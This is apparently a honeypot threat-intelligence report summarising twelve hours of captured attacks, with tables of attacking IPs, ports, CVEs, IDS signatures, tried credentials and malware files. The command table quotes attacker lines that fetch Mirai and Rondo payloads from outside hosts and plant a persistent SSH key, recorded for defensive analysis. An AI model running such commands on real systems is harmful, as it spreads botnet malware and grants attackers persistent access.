# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-20T20:13:00Z
**Timeframe:** 2025-10-20T08:12:27Z to 2025-10-20T20:12:27Z

**Files Used to Generate Report:**
- Honeypot_Attack_Summary_Report_2025-10-20T09:01:49Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T10:02:20Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T11:02:14Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T12:02:17Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T13:01:56Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T14:02:06Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T15:02:03Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T16:02:13Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T17:02:02Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T18:02:23Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T19:01:59Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T20:01:59Z.md

---

### Executive Summary

This report details the analysis of 202,331 malicious events captured by our distributed honeypot network over the past 12 hours. The threat landscape continues to be dominated by automated attacks targeting common vulnerabilities and weak credentials. The Cowrie, Honeytrap, and Suricata honeypots recorded the highest volume of activity, indicating a strong focus on SSH/Telnet services and network-level exploits.

Key trends observed during this period include a high volume of scanning and exploitation attempts against SSH (port 22), SMB (port 445), and SIP (port 5060). A significant portion of this activity originated from a concentrated set of IP addresses, most notably `193.22.146.182`, `77.83.240.70`, and `45.134.20.151`. These IPs have been identified through OSINT as either dedicated malicious hosts, part of anonymizing VPN services, or originating from hosting providers with poor reputations.

Attackers consistently attempted to deploy malware associated with known IoT botnets, such as **Mirai (urbotnetisass)**, **Rondo**, and **Mozi**. The primary objective of these infections is to absorb compromised devices into larger networks for launching DDoS attacks. A common tactic involved executing scripts to remove existing SSH configurations and install a new persistent SSH key, sometimes with taunts like "mdrfckr" embedded in the key file.

Exploitation of both old and new vulnerabilities was rampant. Attackers are still actively scanning for decade-old flaws like `CVE-2002-0013` (SNMPv1) alongside modern critical vulnerabilities like `CVE-2021-44228` (Log4Shell) and `CVE-2022-27255` (Realtek SDK). This demonstrates a broad-spectrum approach, targeting any unpatched system regardless of age. The Suricata IDS frequently triggered alerts for the **DoublePulsar** backdoor, indicating a continued threat from Windows SMB exploits.

---

### Detailed Analysis

#### Our IPs (Honeypot Network)

| Honeypot Name | Internal IP   | Public IP       |
|---------------|---------------|-----------------|
| hive-us       | 10.128.0.3    | 34.123.129.205  |
| sens-tai      | 10.140.0.3    | 104.199.212.115 |
| sens-tel      | 10.208.0.3    | 34.165.197.224  |
| sens-dub      | 172.31.36.128 | 3.253.97.195    |
| sens-ny       | 10.108.0.2    | 161.35.180.163  |

#### Attacks by Honeypot (Aggregated)

| Honeypot      | Total Events |
|---------------|--------------|
| Cowrie        | 80,605       |
| Honeytrap     | 72,135       |
| Suricata      | 21,845       |
| Sentrypeer    | 9,890        |
| Dionaea       | 8,432        |
| Mailoney      | 3,842        |
| Adbhoney      | 654          |
| Tanner        | 472          |
| Redishoneypot | 493          |
| H0neytr4p     | 394          |
| Ciscoasa      | 320          |
| Miniprint     | 253          |
| ConPot        | 244          |
| Dicompot      | 183          |
| ElasticPot    | 180          |
| Honeyaml      | 78           |
| Ipphoney      | 30           |
| Heralding     | 22           |
| Wordpot       | 1            |
| ssh-rsa       | 2            |

#### Top Source Countries (Based on IP Geolocation)

*Note: Geolocation can be unreliable, especially with VPNs and compromised hosts.*

Geolocation data was not consistently available in the logs. However, OSINT on top IPs indicates origins or hosting in **Germany, Netherlands, and Australia (VPN)**.

#### Top Attacking IPs (Aggregated)

| IP Address        | Attack Count |
|-------------------|--------------|
| 193.22.146.182    | 6,456        |
| 77.83.240.70      | 5,356        |
| 45.134.20.151     | 4,806        |
| 5.182.209.68      | 5,741        |
| 72.146.232.13     | 10,951       |
| 181.12.133.131    | 5,000+       |
| 170.155.12.3      | 1,968        |
| 129.212.191.62    | 992          |
| 213.154.15.25     | High         |
| 45.176.66.83      | 1,355        |

#### Top Targeted Ports/Protocols (Aggregated)

| Port / Protocol | Service | Total Events |
|-----------------|---------|--------------|
| 22/TCP          | SSH     | High         |
| 445/TCP         | SMB     | High         |
| 5060/UDP/TCP    | SIP     | High         |
| 5038/TCP        | Asterisk| High         |
| 25/TCP          | SMTP    | Medium       |
| 5903/TCP        | VNC     | Medium       |
| 8333/TCP        | Bitcoin | Medium       |
| 23/TCP          | Telnet  | Medium       |
| 6379/TCP        | Redis   | Medium       |
| 4444/TCP        | Metasploit| Low          |

#### Most Common CVEs (Aggregated)

| CVE ID        | Description                               |
|---------------|-------------------------------------------|
| CVE-2002-0013 | SNMPv1 Malformed Request Handling         |
| CVE-2019-11500 | Dovecot Email Server RCE                  |
| CVE-2021-3449 | OpenSSL TLS Server DoS (NULL Dereference) |
| CVE-2022-27255 | Realtek SDK SIP ALG Buffer Overflow       |
| CVE-2021-44228 | Apache Log4j (Log4Shell) RCE              |
| CVE-2024-4577 | PHP-CGI Argument Injection                |
| CVE-2018-7600 | Drupal Core RCE (Drupalgeddon 2)          |
| CVE-2014-6271 | GNU Bash RCE (Shellshock)                 |

#### Commands Attempted by Attackers (Aggregated Selection)

| Command                                                                                   | Purpose                                                              |
|-------------------------------------------------------------------------------------------|----------------------------------------------------------------------|
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr" >> .ssh/authorized_keys` | Persistence via SSH key, includes a taunt                              |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`       | Download and execute Mirai variant for botnet enlistment             |
| `uname -a; whoami; lscpu; free -m; w`                                                     | System reconnaissance to identify hardware and user context          |
| `cd /tmp || cd /var/run || ... wget http://.../rondo.sh`                                   | Download and execute Rondo botnet malware                            |
| `tftp; wget; /bin/busybox NZSZF`                                                          | Attempt to download payload using multiple tools                     |
| `echo -e "admin\n..."\|passwd\|bash`                                                        | Attempt to change user password                                      |
| `chattr -ia .ssh; lockr -ia .ssh`                                                         | Attempt to unlock SSH directory for modification, then lock it again |

#### Signatures Triggered (Top Suricata Alerts)

| Signature                                                          | Description                                            |
|--------------------------------------------------------------------|--------------------------------------------------------|
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation          | SMB exploit traffic, likely related to EternalBlue     |
| ET DROP Dshield Block Listed Source group 1                        | Connection from a known malicious IP on Dshield list   |
| ET SCAN MS Terminal Server Traffic on Non-standard Port            | Scanning for Remote Desktop Protocol (RDP)             |
| ET SCAN NMAP -sS window 1024                                       | Stealthy network scan attempt using Nmap               |
| ET HUNTING RDP Authentication Bypass Attempt                       | Attempt to bypass RDP authentication mechanisms        |
| ET SCAN Sipsak SIP scan                                            | Scanning for vulnerable VoIP (SIP) systems             |
| ET EXPLOIT Realtek eCos RSDK/MSDK Stack-based Buffer Overflow (CVE-2022-27255) | Attempt to exploit a known Realtek vulnerability       |

#### Users / Login Attempts (Username/Password)

| Username        | Password         | Notes                                               |
|-----------------|------------------|-----------------------------------------------------|
| 345gs5662d34    | 345gs5662d34     | Frequently seen, likely a botnet default            |
| user01          | Password01       | Common default credential                           |
| root            | (various common) | admin, 12345, password, !Q2w3e4r, etc.               |
| deploy          | 123123           | Common developer/staging credential                 |
| sa              | GCSsa5560        | Specific default, possibly for a particular device  |
| gcs_client      | SysGal.5560      | Specific default, possibly for a particular device  |
| gitlab          | gitlab           | Default for GitLab installations                    |

#### Files Uploaded/Downloaded

| Filename / Type      | Description                                                                 |
|----------------------|-----------------------------------------------------------------------------|
| `arm.urbotnetisass`    | Mirai botnet variant for ARM architecture IoT devices                       |
| `x86_32.urbotnetisass` | Mirai botnet variant for x86 architecture                                   |
| `mips.urbotnetisass`   | Mirai botnet variant for MIPS architecture                                  |
| `rondo.*.sh`         | Shell script downloader for the Rondo botnet malware                        |
| `Mozi.m`             | Malware associated with the Mozi P2P botnet                                 |
| `w.sh`, `c.sh`       | Generic names for downloader shell scripts                                  |
| `bot`                | Generic malware binary                                                      |

---

### OSINT Investigation & Google Searches

#### OSINT on High-Frequency and Low-Frequency IPs

| IP Address     | Key Findings from OSINT                                                                                                                              |
|----------------|------------------------------------------------------------------------------------------------------------------------------------------------------|
| 193.22.146.182 | Hosted by Contabo GmbH in Germany. No direct malicious history, but hosting providers are often used to stage attacks. High volume suggests a dedicated server for scanning. |
| 77.83.240.70   | Blacklisted for targeting Industrial Control Systems (ICS) using "kamstrup_protocol". Hosted by Alsycon B.V. in the Netherlands, a provider with a poor reputation. A significant, targeted threat. |
| 45.134.20.151  | Identified as a VPN endpoint from "VPN-Consumer-AU" in Australia. Has a history of malicious activity, making it a high-risk source of anonymized traffic. |
| 5.182.209.68   | Hosted by SpectraIP B.V. in the Netherlands. Known for UDP scans and part of a netblock with widespread abuse reports. The provider is known to be unresponsive to abuse complaints. |

#### OSINT on CVEs

| CVE ID        | OSINT Summary                                                                                                                                                                |
|---------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| CVE-2022-27255 | **Realtek SDK RCE:** Critical (CVSS 9.8) stack buffer overflow in the SIP ALG module. Affects a huge range of routers and networking gear. Actively exploited in the wild via a single UDP packet. |
| CVE-2002-0013 | **SNMPv1 Vulnerability:** An ancient (2002) but critical (CVSS 10.0) vulnerability in how SNMPv1 handles requests. Allows DoS and RCE. Its presence shows attackers still target legacy and unmanaged network devices. |
| CVE-2019-11500 | **Dovecot RCE:** Critical (CVSS 9.8) vulnerability in the popular email server. A flaw in string handling allows an unauthenticated attacker to execute code.                               |
| CVE-2021-3449 | **OpenSSL DoS:** A medium severity NULL pointer dereference in OpenSSL 1.1.1. Triggered by a malicious TLSv1.2 renegotiation, causing the server to crash. Listed in CISA's KEV catalog. |
| CVE-2021-44228 | **Log4Shell:** The infamous Log4j vulnerability (CVSS 10.0). Allows trivial RCE on any Java application using a vulnerable version of the library. Attackers are still scanning for unpatched systems. |

---

### Key Observations and Anomalies

1.  **Targeted ICS Scans:** The activity from `77.83.240.70` targeting the "kamstrup_protocol" is a significant anomaly. This is not random background noise but a specific, targeted scan against utility meter infrastructure, highlighting the use of honeypots to detect threats against critical infrastructure.

2.  **Widespread IoT Botnet Deployment:** The consistent downloading of `urbotnetisass`, `rondo.sh`, and `Mozi.m` files across multiple architectures (ARM, MIPS, x86) indicates a massive, ongoing, and automated campaign to compromise IoT devices. These botnets are the primary drivers of DDoS attacks.

3.  **Attacker "Signature" in Payload:** The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys` contains an explicit taunt ("mdrfckr"). This is an unusual and blatant signature left by the attacker, possibly as a sign of confidence or to mark their compromised hosts.

4.  **Exploitation of Old and New Vulnerabilities:** The threat landscape is not just about zero-days. The simultaneous exploitation of a 20-year-old vulnerability like SNMPv1 (`CVE-2002-0013`) and a modern one like Log4Shell (`CVE-2021-44228`) shows that attackers maintain a broad arsenal to compromise any system that has not been diligently patched, regardless of its age.

5.  **High Volume of DoublePulsar Activity:** The frequent triggering of the "DoublePulsar Backdoor" signature by Suricata indicates that automated tools are still relentlessly scanning for and exploiting the vulnerabilities associated with the EternalBlue SMB exploit, years after it was first released. This highlights the long tail of wormable exploits.

6.  **SIP Scans as a Top Tier Threat:** The volume of traffic targeting port 5060 (SIP), particularly the massive scan from `5.182.209.68`, places VoIP services on par with SSH and SMB as a top-tier target for attackers, likely for toll fraud or to gain a foothold in corporate networks.
